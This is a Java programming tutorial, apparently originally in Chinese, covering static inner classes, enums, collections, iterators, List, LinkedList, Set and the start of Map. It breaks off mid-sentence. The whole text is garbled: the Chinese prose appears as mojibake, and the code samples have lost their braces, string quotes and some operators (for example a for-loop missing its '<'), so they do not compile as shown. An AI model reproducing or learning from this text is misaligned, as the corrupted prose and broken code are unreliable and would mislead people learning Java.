å¯ä»¥ç›´æ¥è®¿é—®å¤–éƒ¨ç±»æ‰€æœ‰çš„é™æ€æˆå‘˜ï¼ŒåŒ…å«ç§æœ‰çš„ï¼Œä½†ä¸èƒ½ç›´æ¥è®¿é—®éé™æ€æˆå‘˜ å½“å¤–éƒ¨ç±»å’Œé™æ€å†…éƒ¨ç±»é‡åæ—¶ï¼Œé™æ€å†…éƒ¨ç±»è®¿é—®æ—¶ï¼Œéµå¾ªå°±è¿‘åŸåˆ™ï¼Œå¦‚æœæƒ³è®¿é—®å¤–éƒ¨ç±»çš„æˆå‘˜ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¤–éƒ¨ç±»å.æˆå‘˜æ¥è®¿é—® æšä¸¾åŸºç¡€Java æšä¸¾ç±»ä½¿ç”¨ enum å…³é”®å­—æ¥å®šä¹‰ï¼Œå„ä¸ªå¸¸é‡ä½¿ç”¨é€—å· , æ¥åˆ†å‰²ã€‚ ä¾‹å¦‚å®šä¹‰ä¸€ä¸ªé¢œè‰²çš„æšä¸¾ç±»ã€‚ enum Color RED, GREEN, BLUE; ä»¥ä¸Šæšä¸¾ç±» Color é¢œè‰²å¸¸é‡æœ‰ RED, GREEN, BLUEï¼Œåˆ†åˆ«è¡¨ç¤ºçº¢è‰²ï¼Œç»¿è‰²ï¼Œè“è‰² enum Color RED, GREEN, BLUE; public class Test // æ‰§è¡Œè¾“å‡ºç»“æœ public static void main(String[] args) Color c1 = Color.RED; System.out.println(c1); å†…éƒ¨ç±»ä¸­ä½¿ç”¨æšä¸¾æšä¸¾ç±»ä¹Ÿå¯ä»¥å£°æ˜åœ¨å†…éƒ¨ç±»ä¸­ï¼š public class Test enum Color RED, GREEN, BLUE; // æ‰§è¡Œè¾“å‡ºç»“æœ public static void main(String[] args) Color c1 = Color.RED; System.out.println(c1); æ¯ä¸ªæšä¸¾éƒ½æ˜¯é€šè¿‡ Class åœ¨å†…éƒ¨å®ç°çš„ï¼Œä¸”æ‰€æœ‰çš„æšä¸¾å€¼éƒ½æ˜¯ public static final çš„ã€‚ ä»¥ä¸Šçš„æšä¸¾ç±» Color è½¬åŒ–åœ¨å†…éƒ¨ç±»å®ç°ï¼š class Color public static final Color RED = new Color(); public static final Color BLUE = new Color(); public static final Color GREEN = new Color(); è¿­ä»£æšä¸¾å…ƒç´ å¯ä»¥ä½¿ç”¨ for è¯­å¥æ¥è¿­ä»£æšä¸¾å…ƒç´ ï¼š enum Color RED, GREEN, BLUE; public class MyClass public static void main(String[] args) for (Color myVar : Color.values()) System.out.println(myVar); //Color.values() æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè¿”å›æšä¸¾ç±»å‹ä¸­æ‰€æœ‰å®šä¹‰çš„å¸¸é‡å€¼ï¼ˆå³ REDã€GREEN å’Œ BLUEï¼‰ä½œä¸ºä¸€ä¸ªæ•°ç»„ åœ¨ switch ä¸­ä½¿ç”¨æšä¸¾ç±»æšä¸¾ç±»å¸¸åº”ç”¨äº switch è¯­å¥ä¸­ï¼š enum Color RED, GREEN, BLUE; public class MyClass public static void main(String[] args) Color myVar = Color.BLUE; switch(myVar) case RED: System.out.println(çº¢è‰²); break; case GREEN: System.out.println(ç»¿è‰²); break; case BLUE: System.out.println(è“è‰²); break; values(), ordinal() å’Œ valueOf() æ–¹æ³•enum å®šä¹‰çš„æšä¸¾ç±»é»˜è®¤ç»§æ‰¿äº† java.lang.Enum ç±»ï¼Œå¹¶å®ç°äº† java.lang.Serializable å’Œ java.lang.Comparable ä¸¤ä¸ªæ¥å£ã€‚ values(), ordinal() å’Œ valueOf() æ–¹æ³•ä½äº java.lang.Enum ç±»ä¸­ï¼š values() è¿”å›æšä¸¾ç±»ä¸­æ‰€æœ‰çš„å€¼ã€‚ ordinal()æ–¹æ³•å¯ä»¥æ‰¾åˆ°æ¯ä¸ªæšä¸¾å¸¸é‡çš„ç´¢å¼•ï¼Œå°±åƒæ•°ç»„ç´¢å¼•ä¸€æ ·ã€‚ valueOf()æ–¹æ³•è¿”å›æŒ‡å®šå­—ç¬¦ä¸²å€¼çš„æšä¸¾å¸¸é‡ã€‚ enum Color RED, GREEN, BLUE; public class Test public static void main(String[] args) // è°ƒç”¨ values() Color[] arr = Color.values(); // è¿­ä»£æšä¸¾ for (Color col : arr) // æŸ¥çœ‹ç´¢å¼• System.out.println(col + at index + col.ordinal()); // ä½¿ç”¨ valueOf() è¿”å›æšä¸¾å¸¸é‡ï¼Œä¸å­˜åœ¨çš„ä¼šæŠ¥é”™ IllegalArgumentException System.out.println(Color.valueOf(RED)); // System.out.println(Color.valueOf(WHITE)); æšä¸¾ç±»æˆå‘˜æšä¸¾è·Ÿæ™®é€šç±»ä¸€æ ·å¯ä»¥ç”¨è‡ªå·±çš„å˜é‡ã€æ–¹æ³•å’Œæ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°åªèƒ½ä½¿ç”¨ private è®¿é—®ä¿®é¥°ç¬¦ï¼Œæ‰€ä»¥å¤–éƒ¨æ— æ³•è°ƒç”¨ æšä¸¾æ—¢å¯ä»¥åŒ…å«å…·ä½“æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥åŒ…å«æŠ½è±¡æ–¹æ³•ã€‚ å¦‚æœæšä¸¾ç±»å…·æœ‰æŠ½è±¡æ–¹æ³•ï¼Œåˆ™æšä¸¾ç±»çš„æ¯ä¸ªå®ä¾‹éƒ½å¿…é¡»å®ç°å®ƒ enum Color RED, GREEN, BLUE; // æ„é€ å‡½æ•° private Color() System.out.println(Constructor called for : + this.toString()); public void colorInfo() System.out.println(Universal Color); public class Test // è¾“å‡º public static void main(String[] args) Color c1 = Color.RED; System.out.println(c1); c1.colorInfo(); é›†åˆJava çš„é›†åˆç±»ä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ï¼š 1.Collection æ¥å£çš„å­ç±»ï¼ˆå•åˆ—é›†åˆï¼‰ï¼šæ˜¯ Java é›†åˆæ¡†æ¶ä¸­çš„æ ¹æ¥å£ï¼Œä¸»è¦ç”¨äºå­˜å‚¨ä¸€ç»„å…ƒç´  å¸¸è§å­æ¥å£åŒ…æ‹¬ï¼š Listï¼ˆåˆ—è¡¨ï¼‰ï¼šæœ‰åºä¸”å…è®¸é‡å¤çš„é›†åˆï¼Œå¸¸ç”¨å®ç°ç±»åŒ…æ‹¬ï¼š ArrayList LinkedList Vector Setï¼ˆé›†åˆï¼‰ï¼šæ— åºä¸”ä¸å…è®¸é‡å¤çš„é›†åˆï¼Œå¸¸ç”¨å®ç°ç±»åŒ…æ‹¬ï¼š HashSet LinkedHashSet TreeSet Queueï¼ˆé˜Ÿåˆ—ï¼‰ï¼šç”¨äºæŒ‰é¡ºåºå¤„ç†å…ƒç´ ï¼Œå¸¸ç”¨å®ç°ç±»åŒ…æ‹¬ï¼š LinkedList PriorityQueue 2.Map æ¥å£çš„å­ç±»ï¼ˆåŒåˆ—é›†åˆï¼‰ï¼šä¸»è¦ç”¨äºå­˜å‚¨é”®å€¼å¯¹ Collectionæ¥å£å’Œå¸¸ç”¨æ–¹æ³•åŸºæœ¬æ“ä½œCollection å®šä¹‰äº†é›†åˆå¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼Œä¾‹å¦‚æ·»åŠ ã€åˆ é™¤ã€éå†ã€æ¸…ç©ºç­‰ã€‚è¿™äº›æ–¹æ³•è¢«å­ç±»ï¼ˆå¦‚ Listã€Set ç­‰ï¼‰ç»§æ‰¿å¹¶å…·ä½“å®ç°ã€‚ä¸»è¦æ–¹æ³•åŒ…æ‹¬ï¼š add(E e)ï¼šå‘é›†åˆä¸­æ·»åŠ å…ƒç´ ã€‚ remove(Object o)ï¼šä»é›†åˆä¸­ç§»é™¤æŒ‡å®šå…ƒç´ ã€‚ contains(Object o)ï¼šåˆ¤æ–­é›†åˆä¸­æ˜¯å¦åŒ…å«æŒ‡å®šå…ƒç´ ã€‚ size()ï¼šè¿”å›é›†åˆä¸­å…ƒç´ çš„ä¸ªæ•°ã€‚ isEmpty()ï¼šåˆ¤æ–­é›†åˆæ˜¯å¦ä¸ºç©ºã€‚ clear()ï¼šæ¸…ç©ºé›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ import java.util.ArrayList;import java.util.List;public class New //å¿½ç•¥æ‰€æœ‰ç±»å‹çš„è­¦å‘Š @SuppressWarnings(all) public static void main (String []args) List list = new ArrayList();// add:æ·»åŠ å•ä¸ªå…ƒç´  list.add(jack); list.add(10);//list.add(new Integer(10)) list.add(true); System.out.println(list= + list);// remove:åˆ é™¤æŒ‡å®šå…ƒç´ //list.remove(0);//åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´  list.remove(true);//æŒ‡å®šåˆ é™¤æŸä¸ªå…ƒç´  System.out.println(list= + list);// contains:æŸ¥æ‰¾å…ƒç´ æ˜¯å¦å­˜åœ¨ System.out.println(list.contains(jack));//T// size:è·å–å…ƒç´ ä¸ªæ•° System.out.println(list.size());//2 // isEmpty:åˆ¤æ–­æ˜¯å¦ä¸ºç©º System.out.println(list.isEmpty());//F// clear:æ¸…ç©º list.clear(); System.out.println(list= + list);// addAll:æ·»åŠ å¤šä¸ªå…ƒç´  ArrayList list2 = new ArrayList(); list2.add(çº¢æ¥¼æ¢¦); list2.add(ä¸‰å›½æ¼”ä¹‰); list.addAll(list2); System.out.println(list= + list);// containsAll:æŸ¥æ‰¾å¤šä¸ªå…ƒç´ æ˜¯å¦éƒ½å­˜åœ¨ System.out.println(list.containsAll(list2));//T// removeAllï¼šåˆ é™¤å¤šä¸ªå…ƒç´  list.add(èŠæ–‹); list.removeAll(list2); System.out.println(list= + list);//[èŠæ–‹]// è¯´æ˜ï¼šä»¥ ArrayList å®ç°ç±»æ¥æ¼”ç¤º. ç”¨ Iterator(è¿­ä»£å™¨)éå†æ¥å£å…ƒç´  ä¸»è¦ç”¨äºéå†Collectioné›†åˆä¸­çš„å…ƒç´  æ‰€æœ‰å®ç°Collectionæ¥å£çš„é›†åˆç±»éƒ½æœ‰ä¸€ä¸ªIterator()æ–¹æ³•ï¼Œç”¨ä»¥è¿”å›ä¸€ä¸ªå®ç°äº†Iteratoræ¥å£çš„å¯¹è±¡ï¼Œå³å¯ä»¥è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ Iteratorä»…ç”¨äºéå†é›†åˆï¼Œå…¶æœ¬èº«å¹¶ä¸å­˜æ”¾å¯¹è±¡ é€šå¸¸ï¼ŒIterator ä¸ while å¾ªç¯ä¸€èµ·ä½¿ç”¨ï¼Œé€šè¿‡å…¶æ–¹æ³•æ¥è¿›è¡Œéå†ã€‚ è¿­ä»£å™¨çš„å·¥ä½œåŸç† åˆ›å»ºè¿­ä»£å™¨ï¼šè°ƒç”¨é›†åˆå¯¹è±¡çš„ iterator() æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ª Iterator å®ä¾‹ã€‚è¿™ä¸ªè¿­ä»£å™¨æŒ‡å‘é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰çš„ä½ç½®ã€‚ éå†å…ƒç´ ï¼šé€šè¿‡ hasNext() æ¥æ£€æŸ¥æ˜¯å¦æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œé€šè¿‡ next() æ¥è·å–ä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚å†…éƒ¨ä¼šè®°å½•å½“å‰ä½ç½®ï¼Œæ¯è°ƒç”¨ä¸€æ¬¡ next()ï¼Œè¿­ä»£å™¨ä¼šç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚ åˆ é™¤å…ƒç´ ï¼ˆå¯é€‰ï¼‰ï¼šå¦‚æœéœ€è¦ï¼Œå¯ä»¥è°ƒç”¨ remove() æ–¹æ³•æ¥åˆ é™¤åˆšåˆšé€šè¿‡ next() è®¿é—®çš„å…ƒç´  Iterator æ¥å£åŒ…å«ä»¥ä¸‹ä¸‰ä¸ªæ ¸å¿ƒæ–¹æ³•ï¼š boolean hasNext(): æ£€æŸ¥é›†åˆä¸­æ˜¯å¦è¿˜æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœå­˜åœ¨ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ if (iterator.hasNext()) // Do something E next(): è¿”å›é›†åˆä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æœè°ƒç”¨æ—¶æ²¡æœ‰å…ƒç´ ï¼Œé€šå¸¸ä¼šæŠ›å‡º NoSuchElementExceptionã€‚ E element = iterator.next(); void remove(): ä»åº•å±‚é›†åˆä¸­ç§»é™¤ next() æ–¹æ³•è¿”å›çš„ä¸Šä¸€ä¸ªå…ƒç´ ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯å¯é€‰çš„ï¼Œå¦‚æœé›†åˆä¸æ”¯æŒå…ƒç´ çš„åˆ é™¤æ“ä½œï¼Œå¯èƒ½ä¼šæŠ›å‡º UnsupportedOperationExceptionã€‚ æ¥ä¸ªç®€å•çš„ä¾‹å­ import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class IteratorExample public static void main(String[] args) ListString list = new ArrayList(); list.add(apple); list.add(banana); list.add(cherry); IteratorString iterator = list.iterator(); while (iterator.hasNext()) String element = iterator.next(); System.out.println(element); ç‰¹ç‚¹ Iterator æä¾›äº†ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥éå†ä¸åŒç±»å‹çš„é›†åˆã€‚ å®ƒåªæ”¯æŒå•å‘éå†ï¼Œä¸å…è®¸å›é€€ã€‚ï¼ˆæƒ³å†æ¬¡éå†éœ€è¦é‡ç½®è¿­ä»£å™¨ï¼Œå³iterator = col.iterator();ï¼‰ ä¸å¢å¼ºçš„ for å¾ªç¯ç›¸æ¯”ï¼ŒIterator æä¾›äº†æ›´ç»†ç²’åº¦çš„æ§åˆ¶ï¼ˆå¦‚åˆ é™¤æ“ä½œï¼‰ å¢å¼ºforå¾ªç¯å¢å¼ºforå¾ªç¯ï¼Œå¯ä»¥æ›¿ä»£iteratorè¿­ä»£å™¨ ç‰¹ç‚¹ï¼šå…¶å®å°±æ˜¯ç®€å•ç‰ˆçš„iteratorï¼Œæœ¬è´¨ä¸€æ ·ï¼Œåªèƒ½ç”¨äºéå†é›†åˆæˆ–è€…æ•°ç»„ åŸºæœ¬è¯­æ³•ï¼š for(å…ƒç´ ç±»å‹ å…ƒç´ å:é›†åˆåæˆ–æ•°ç»„å)\tè®¿é—®å…ƒç´  ä¾‹å­å¦‚ä¸‹ï¼š import java.util.ArrayList;import java.util.Iterator;import java.util.List;public class New @SuppressWarnings(all) public static void main(String[] args) List list = new ArrayList(); list.add(new Dog(å°é»‘, 3)); list.add(new Dog(å¤§é»„, 100)); list.add(new Dog(å¤§å£®, 8));//å…ˆä½¿ç”¨ for å¢å¼º for (Object dog : list) System.out.println(dog= + dog); //ä½¿ç”¨è¿­ä»£å™¨ System.out.println(===ä½¿ç”¨è¿­ä»£å™¨æ¥éå†===); Iterator iterator = list.iterator(); while (iterator.hasNext()) Object dog = iterator.next(); System.out.println(dog= + dog); /** * åˆ›å»º 3 ä¸ª Dog name, age å¯¹è±¡ï¼Œæ”¾å…¥åˆ° ArrayList ä¸­ï¼Œèµ‹ç»™ List å¼•ç”¨ * ç”¨è¿­ä»£å™¨å’Œå¢å¼º for å¾ªç¯ä¸¤ç§æ–¹å¼æ¥éå† * é‡å†™ Dog çš„ toString æ–¹æ³•ï¼Œ è¾“å‡º name å’Œ age */class Dog private String name; private int age; public Dog(String name, int age) this.name = name; this.age = age; public String getName() return name; public void setName(String name) this.name = name; public int getAge() return age; public void setAge(int age) this.age = age; @Override public String toString() return Dog + name= + name + \\ + , age= + age + ; Listæ¥å£å’Œå¸¸ç”¨æ–¹æ³•åŸºæœ¬ Listæ¥å£æ˜¯Collectionæ¥å£çš„å­æ¥å£ Listé›†åˆç±»ä¸­å…ƒç´ æœ‰åºï¼ˆå³æ·»åŠ é¡ºåºå’Œå–å‡ºé¡ºåºä¸€è‡´ï¼‰ã€ä¸”å¯é‡å¤ Listé›†åˆä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æœ‰å…¶å¯¹åº”çš„é¡ºåºç´¢å¼• Listå®¹å™¨ä¸­çš„å…ƒç´ éƒ½å¯¹åº”ä¸€ä¸ªæ•´æ•°å‹çš„åºå·è®°è½½å…¶åœ¨å®¹å™¨ä¸­çš„ä½ç½®ï¼Œå¯ä»¥æ ¹æ®åºå·å­˜å–å®¹å™¨ä¸­çš„å…ƒç´  å¸¸ç”¨æ–¹æ³•ä»¥ä¸‹æ˜¯ List æ¥å£ä¸­çš„ä¸€äº›å¸¸ç”¨æ–¹æ³•ï¼š void add(E element) åŠŸèƒ½: å°†æŒ‡å®šçš„å…ƒç´ æ·»åŠ åˆ°åˆ—è¡¨çš„æœ«å°¾ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple); void add(int index, E element) åŠŸèƒ½: åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´ ã€‚å…¶åçš„å…ƒç´ å°†å‘å³ç§»åŠ¨ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.add(0, Banana); // åœ¨ç´¢å¼• 0 ä½ç½®æ’å…¥å…ƒç´  E get(int index) åŠŸèƒ½: è¿”å›åˆ—è¡¨ä¸­æŒ‡å®šç´¢å¼•å¤„çš„å…ƒç´ ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);String fruit = list.get(0); // è·å–ç´¢å¼• 0 å¤„çš„å…ƒç´  E set(int index, E element) åŠŸèƒ½: ç”¨æŒ‡å®šçš„å…ƒç´ æ›¿æ¢åˆ—è¡¨ä¸­æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›è¢«æ›¿æ¢çš„å…ƒç´ ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.set(0, Banana); // å°†ç´¢å¼• 0 å¤„çš„å…ƒç´ æ›¿æ¢ä¸º Banana E remove(int index) åŠŸèƒ½: ç§»é™¤æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›è¢«ç§»é™¤çš„å…ƒç´ ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.remove(0); // ç§»é™¤ç´¢å¼• 0 å¤„çš„å…ƒç´  boolean remove(Object o) åŠŸèƒ½: ä»åˆ—è¡¨ä¸­ç§»é™¤é¦–æ¬¡å‡ºç°çš„æŒ‡å®šå…ƒç´ ã€‚å¦‚æœåˆ—è¡¨ä¸­åŒ…å«è¯¥å…ƒç´ ï¼Œè¿”å› trueï¼›å¦åˆ™ï¼Œè¿”å› falseã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.remove(Apple); // ç§»é™¤å…ƒç´  Apple int size() åŠŸèƒ½: è¿”å›åˆ—è¡¨ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);int size = list.size(); // è¿”å›åˆ—è¡¨çš„å¤§å° boolean isEmpty() åŠŸèƒ½: å¦‚æœåˆ—è¡¨ä¸åŒ…å«å…ƒç´ ï¼Œåˆ™è¿”å› trueï¼›å¦åˆ™ï¼Œè¿”å› falseã€‚ ç¤ºä¾‹ ListString list = new ArrayList();boolean isEmpty = list.isEmpty(); // æ£€æŸ¥åˆ—è¡¨æ˜¯å¦ä¸ºç©º boolean contains(Object o) åŠŸèƒ½: å¦‚æœåˆ—è¡¨ä¸­åŒ…å«æŒ‡å®šçš„å…ƒç´ ï¼Œåˆ™è¿”å› trueã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);boolean contains = list.contains(Apple); // æ£€æŸ¥æ˜¯å¦åŒ…å« Apple int indexOf(Object o) åŠŸèƒ½: è¿”å›åˆ—è¡¨ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„æŒ‡å®šå…ƒç´ çš„ç´¢å¼•ï¼Œå¦‚æœåˆ—è¡¨ä¸­ä¸åŒ…å«è¯¥å…ƒç´ ï¼Œåˆ™è¿”å› -1ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);int index = list.indexOf(Apple); // è¿”å›å…ƒç´  Apple çš„ç´¢å¼• int lastIndexOf(Object o) åŠŸèƒ½: è¿”å›åˆ—è¡¨ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„æŒ‡å®šå…ƒç´ çš„ç´¢å¼•ï¼Œå¦‚æœåˆ—è¡¨ä¸­ä¸åŒ…å«è¯¥å…ƒç´ ï¼Œåˆ™è¿”å› -1ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.add(Banana);list.add(Apple);int lastIndex = list.lastIndexOf(Apple); // è¿”å› Apple æœ€åå‡ºç°çš„ç´¢å¼• void clear() åŠŸèƒ½: ç§»é™¤åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.clear(); // æ¸…ç©ºåˆ—è¡¨ ListE subList(int fromIndex, int toIndex) åŠŸèƒ½: è¿”å›åˆ—è¡¨ä¸­æŒ‡å®šèŒƒå›´å†…çš„å…ƒç´ çš„è§†å›¾ï¼ˆåŒ…å« fromIndexï¼Œä¸åŒ…å« toIndexï¼‰ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);list.add(Banana);list.add(Cherry);ListString sublist = list.subList(0, 2); // è¿”å›å­åˆ—è¡¨ [Apple, Banana] Object[] toArray() åŠŸèƒ½: è¿”å›åŒ…å«åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ çš„æ•°ç»„ã€‚ ç¤ºä¾‹ ListString list = new ArrayList();list.add(Apple);Object[] array = list.toArray(); // è½¬æ¢ä¸ºæ•°ç»„ boolean addAll(int index, Collection eles) åŠŸèƒ½: ä» index ä½ç½®å¼€å§‹å°† eles ä¸­çš„æ‰€æœ‰å…ƒç´ æ·»åŠ è¿›æ¥ ç¤ºä¾‹ ListString list1 = new ArrayList();list1.add(Apple);list1.add(Banana);ListString list2 = new ArrayList();list2.add(Cherry);list2.add(Date);list1.addAll(1, list2); // åœ¨ç´¢å¼• 1 å¤„æ’å…¥ list2 çš„æ‰€æœ‰å…ƒç´ System.out.println(list1); LinkedList åº•å±‚ç»“æ„åŸºæœ¬1.åŒå‘é“¾è¡¨ï¼šLinkedList ç”±èŠ‚ç‚¹ç»„æˆï¼Œæ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸‰éƒ¨åˆ†ï¼šä¸€ä¸ªå…ƒç´ å€¼ã€æŒ‡å‘å‰ä¸€ä¸ªèŠ‚ç‚¹çš„å¼•ç”¨ï¼ˆprevï¼‰ã€ä»¥åŠæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„å¼•ç”¨ï¼ˆnextï¼‰ã€‚ 2.åŠ¨æ€æ‰©å±•ï¼šä¸æ•°ç»„ä¸åŒï¼ŒLinkedList ä¸éœ€è¦é¢„å…ˆå®šä¹‰å¤§å°ï¼Œå®ƒå¯ä»¥æ ¹æ®éœ€è¦åŠ¨æ€æ‰©å±•ï¼Œæ–¹ä¾¿åœ¨ä¸­é—´è¿›è¡Œå…ƒç´ æ’å…¥å’Œåˆ é™¤æ“ä½œã€‚ 3.å®ç°æ¥å£ï¼š List æ¥å£ï¼šLinkedList å¯ä»¥å½“ä½œä¸€ä¸ªåˆ—è¡¨æ¥ä½¿ç”¨ï¼Œæ”¯æŒæŒ‰ç´¢å¼•è®¿é—®å…ƒç´ ï¼Œæä¾›åˆ—è¡¨çš„æ‰€æœ‰åŸºæœ¬æ“ä½œï¼Œæ¯”å¦‚å¢åŠ ã€åˆ é™¤ã€è·å–å…ƒç´ ç­‰ã€‚ Deque æ¥å£ï¼šLinkedList å¯ä»¥å½“ä½œåŒç«¯é˜Ÿåˆ—ä½¿ç”¨ï¼Œæ”¯æŒä»ä¸¤ç«¯æ’å…¥å’Œåˆ é™¤å…ƒç´ ï¼Œè¿™ä½¿å¾—å®ƒéå¸¸é€‚åˆç”¨ä½œé˜Ÿåˆ—ï¼ˆFIFOï¼‰æˆ–æ ˆï¼ˆLIFOï¼‰ã€‚ å¸¸ç”¨æ–¹æ³•ï¼š æ·»åŠ å…ƒç´ ï¼š add(E element)ï¼šå°†å…ƒç´ æ·»åŠ åˆ°åˆ—è¡¨æœ«å°¾ã€‚ addFirst(E element)ï¼šåœ¨é“¾è¡¨å¼€å¤´æ·»åŠ å…ƒç´ ã€‚ addLast(E element)ï¼šåœ¨é“¾è¡¨æœ«å°¾æ·»åŠ å…ƒç´ ï¼ˆä¸ add() ç›¸åŒï¼‰ã€‚ åˆ é™¤å…ƒç´ ï¼š remove()ï¼šç§»é™¤å¹¶è¿”å›é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ removeFirst()ï¼šç§»é™¤å¹¶è¿”å›é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆä¸ remove() ç›¸åŒï¼‰ã€‚ removeLast()ï¼šç§»é™¤å¹¶è¿”å›é“¾è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ remove(int index)ï¼šåˆ é™¤é“¾è¡¨ä¸­æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤çš„å…ƒç´ ã€‚ remove(Object o)ï¼šåˆ é™¤é“¾è¡¨ä¸­é¦–æ¬¡å‡ºç°çš„æŒ‡å®šå¯¹è±¡ è®¿é—®å…ƒç´ ï¼š get(int index)ï¼šè·å–æŒ‡å®šä½ç½®çš„å…ƒç´ ã€‚ getFirst()ï¼šè·å–ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ getLast()ï¼šè·å–æœ€åä¸€ä¸ªå…ƒç´  ä¸¾ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹ï¼š import java.util.LinkedList;public class Main public static void main(String[] args) LinkedListString list = new LinkedList(); // æ·»åŠ å…ƒç´  list.add(A); list.add(B); list.addFirst(Start); list.addLast(End); // è®¿é—®å…ƒç´  System.out.println(First element: + list.getFirst()); // Start System.out.println(Last element: + list.getLast()); // End // åˆ é™¤å…ƒç´  list.removeFirst(); // åˆ é™¤ç¬¬ä¸€ä¸ªå…ƒç´  list.removeLast(); // åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´  System.out.println(List after removals: + list); LinkedList vs. ArrayList: ArrayList æ›´é€‚åˆéšæœºè®¿é—®å…ƒç´ ï¼Œå› ä¸ºå®ƒæ˜¯åŸºäºæ•°ç»„å®ç°çš„ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼•å¿«é€Ÿè®¿é—®å…ƒç´ ã€‚ LinkedList æ›´é€‚åˆé¢‘ç¹çš„æ’å…¥å’Œåˆ é™¤æ“ä½œï¼Œå› ä¸ºå®ƒä¸éœ€è¦ç§»åŠ¨å¤§é‡æ•°æ® Setæ¥å£å’Œå¸¸ç”¨æ–¹æ³•åŸºæœ¬æ— åºï¼Œå³æ·»åŠ å’Œå–å‡ºçš„é¡ºåºä¸ä¸€è‡´ï¼Œæ²¡æœ‰ç´¢å¼• ä¸å…è®¸é‡å¤å…ƒç´ ï¼Œæ‰€ä»¥æœ€å¤šåŒ…å«ä¸€ä¸ªnull å¸¸ç”¨æ–¹æ³•Setæ¥å£ä¸ºCollectionæ¥å£çš„å­æ¥å£ï¼Œæ‰€ä»¥å¸¸ç”¨æ–¹æ³•å’ŒColletionæ¥å£ä¸€æ · éå†æ–¹å¼ å¯ä»¥ä½¿ç”¨è¿­ä»£å™¨ å¢å¼ºforå¾ªç¯ ä¸èƒ½ä½¿ç”¨ç´¢å¼•çš„æ–¹å¼æ¥è·å– ä¸¾ä¸ªä¾‹å­å¦‚ä¸‹æ‰€ç¤ºï¼š import java.util.HashSet;import java.util.Iterator;import java.util.Set;public class New @SuppressWarnings(all) public static void main(String[] args) Set set = new HashSet(); set.add(john); set.add(lucy); set.add(john);//é‡å¤ set.add(jack); set.add(hsp); set.add(mary); set.add(null);// set.add(null);//å†æ¬¡æ·»åŠ  null for(int i = 0; i 10;i ++) System.out.println(set= + set); //éå†//æ–¹å¼ 1ï¼š ä½¿ç”¨è¿­ä»£å™¨ System.out.println(=====ä½¿ç”¨è¿­ä»£å™¨====); Iterator iterator = set.iterator(); while (iterator.hasNext()) Object obj = iterator.next(); System.out.println(obj= + obj); set.remove(null);//æ–¹å¼ 2: å¢å¼º for System.out.println(=====å¢å¼º for====); for (Object o : set) System.out.println(o= + o); //set æ¥å£å¯¹è±¡ï¼Œä¸èƒ½é€šè¿‡ç´¢å¼•æ¥è·å– Mapæ¥å£å’Œå¸¸ç”¨æ–¹æ³•ç‰¹ç‚¹ Map æ˜¯ç”¨äºå­˜å‚¨é”®å€¼å¯¹ï¼ˆkey-value pairsï¼‰çš„é›†åˆï¼Œæ¯ä¸ªé”®å”¯ä¸€å¯¹åº”ä¸€ä¸ªå€¼ï¼Œå³å¯ä»¥é€šè¿‡æŒ‡å®šçš„keyæ‰¾åˆ°å¯¹åº”çš„value ä¸èƒ½åŒ…å«é‡å¤çš„é”®ï¼Œä½†å¯ä»¥åŒ…å«é‡å¤çš„å€¼ã€‚ å¸¸è§å®ç°åŒ…æ‹¬ HashMapã€TreeMap å’Œ 